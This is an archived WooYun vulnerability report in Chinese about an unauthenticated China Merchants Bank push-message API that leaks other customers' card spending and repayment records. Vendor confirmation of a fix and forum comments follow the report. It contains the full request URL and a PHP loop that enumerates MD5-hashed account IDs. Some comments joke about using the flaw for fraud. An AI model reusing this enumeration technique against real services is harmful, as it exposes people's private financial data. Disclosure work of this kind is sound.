{"id": 46045, "wybug_id": "wooyun-2015-092892", "wybug_title": "招商银行设计缺陷可以查询其他用户信用卡消费&amp;还款记录（附测试代码）", "wybug_corp": "招商银行", "wybug_author": "牛奶坦克", "wybug_date": "2015-01-20 14:51", "wybug_open_date": "2015-03-06 14:52", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "逻辑错误", "敏感接口未加权限认证", "安全意识不足", "越权操作", "未授权访问", "用户敏感信息泄露", "认证设计不合理", "平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-06：\t细节向公众公开  简要描述： 招商银行设计缺陷可以查询其他用户信用卡消费&还款记录（附测试代码）。其实我也怀疑银行这样设计是不认为这些数据就是影响不大的呢，带着这个疑问提交给厂商验证吧。PS：乌云算法升级了，核心掉了 - - # 详细说明：  一直使用招行的信用卡客户端，有个疑问一直纠结着我，就是每次不用我帐号密码登录就能给我推送消费和还款信息，多年经验告诉我这里没问题就怪了。。但这样的通知放在认证外，是否也说明这种信息没啥影响呢？想在乌云求个答案，了了心思。\n\n数据包是这样的，如图\n\n文本如下\nhttp://mlife.cmbchina.com/PlutoPushProxy/queryMessageFromClient.json?_ver=4.2.0&_requuid=EC92A073-39E9-0467-4C2D-59479A237C88&_pla=cmblife_iphone_4.2.0_&_pro=0&_appId=202cb962ac59075b964b07152d234b70&_r=YES&_iv=24&_accountId=1233e1af18894e0b3e0a79c37771b5ee&_uid=202cb962ac59075b964b07152d234b70&DeviceID=202cb962ac59075b964b07152d234b70&appId=202cb962ac59075b964b07152d234b70&_ss=888*888&_mt=iphone100page=1&category=\n通过分析发现，这么多参数其实都是用来做个统计，真正有效的其实是 _accountId 这个参数，但这个参数是个hash啊。没关系解密看一下发现是个数字，应该是用户ID吧。\n\n数字随便加几个，减几个然后再次md5看看结果呢。   漏洞证明：  给出一段证明代码，用来“遍历”信息，为了防止他人利用，curlsend函数定义不放出\nfor ($i=0; $i < 9 ; $i++) { \t//Demo，仅遍历10个ID\t$userid = md5(\"011990180\".$i);\t$url = \"http://mlife.cmbchina.com/PlutoPushProxy/queryMessageFromClient.json?_ver=4.2.0&_requuid=EC92A073-39E9-0467-4C2D-59479A237C88&_pla=cmblife_iphone_4.2.0_&_pro=0&_appId=202cb962ac59075b964b07152d234b70&_r=YES&_iv=24&_accountId=$userid&_uid=267536746a28e3b3b92428120f84c376&DeviceID=202cb962ac59075b964b07152d234b70&appId=202cb962ac59075b964b07152d234b70&_ss=888*888&_mt=iphone100\";\t$res = json_decode(curlsend($url,1,1,'page=1&category='));\tif (count($res->messages) > 0) {\t\techo \"User : 011990180\".$i.\" $userid  => exists ! \\r\\n\";\t} }\n10个ID内有3个存在\n\n分别请求一下\n\n\n\n\n\n已经可以了吧，结贴。PS：对了 page=1&category= 里面page参数应该是可以翻页的，不测了。   修复方案：  那个ID在服务端加个salt吧，可以解密出来就代表可以伪造了。另外其他那几个花花绿绿的id也没起到什么验证做用，要不加个签名也防止篡改？   版权声明：转载请注明来源 牛奶坦克@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-01-21 09:51 厂商回复： 感谢对招行安全的关注。 最新状态： 2015-01-21：漏洞已修复  ", "replys": "漏洞评价：\n评论\n     2015-01-20 14:52 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  曹,我的就是招行    \n     2015-01-20 14:56 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:207        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  曹,我的只是农村信用合作社    \n     2015-01-20 15:03 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:10        | 猜猜我是谁？)\t\t \n  招行+1快查查剑心的记录    \n     2015-01-20 15:03 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:54        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  这个····用来诈骗还是有点用处的    \n     2015-01-20 15:38 |    \t\t帅气小狼狗 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 汪汪汪)\t\t \n  @毕月乌 小毕    \n     2015-01-20 16:05 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @毕月乌 老毕    \n     2015-01-20 16:16 |    \t\t帅气小狼狗 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 汪汪汪)\t\t \n  @毕月乌 毕毕    \n     2015-01-20 17:21 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:87        | 默默潜水)\t\t \n  不是每一杯牛奶    \n     2015-01-20 17:32 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  老婆查老公的利器，赶紧补上    \n     2015-01-20 17:50 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  草 ，能提高额度不。几年了 就5000块。    \n     2015-01-20 20:37 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  银行专场的开始啊    \n     2015-01-20 20:55 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:78        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @猪猪侠 广州的不是广州农村商业银行么？    \n     2015-01-20 21:21 |    \t\t呆呆 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 小小白)\t\t \n  招商+1啊，牛的一B    \n     2015-01-20 22:21 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:148        | 123)\t\t \n  @xsser @猪猪侠 是cookie的问题，修改即可    \n     2015-01-21 09:42 |    \t\tTeufel \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:12        | 广告位招租)\t\t \n  恩恩这个不错，那个大牛看完发发善心给帮忙把信用卡还了吧O(∩_∩)O    \n     2015-01-21 10:47 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:10        | 猜猜我是谁？)\t\t \n  @帅气小狼狗 你妹的    \n     2015-01-21 11:35 |    \t\t帅气小狼狗 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 汪汪汪)\t\t \n  @毕月乌 妹夫，哥理解你。    \n     2015-01-21 12:46 |    \t\t牛奶坦克 \t\t\t( 普通白帽子  |\t\t\t        Rank:355 漏洞数:20        | 晚安,牛奶)\t\t \n  @招商银行 招行靠谱，这个问题我个人也觉得影响不是特别的严重，但心存顾虑，还是提交给企业解决这个问题。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}